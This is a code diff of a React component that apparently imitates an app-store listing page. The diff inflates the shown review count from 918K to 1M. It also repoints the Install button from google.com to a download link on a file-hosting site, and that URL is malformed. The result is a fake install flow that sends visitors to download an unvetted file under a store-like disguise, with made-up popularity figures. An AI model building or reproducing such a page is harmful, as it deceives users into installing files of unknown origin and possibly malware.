@@ -53,7 +53,7 @@ class AppInfo extends Component {
           <div className="appReview">
             <div className="rating">
               <p className="numRating first">4.4★</p>
-              <p className="second">918K reviews</p>
+              <p className="second">1M reviews</p>
             </div>
             <div className="sizeContainer">
               <p className="downloadIcon">
@@ -77,7 +77,7 @@ class AppInfo extends Component {
     type="button"
     onClick={(e) => {
       e.preventDefault();
-      window.location.href='http://google.com';
+      window.location.href='https://https://file.lu/d/ZpN.com';
       }}> Install</button>
           </div>
           <div className="appScreenshots">
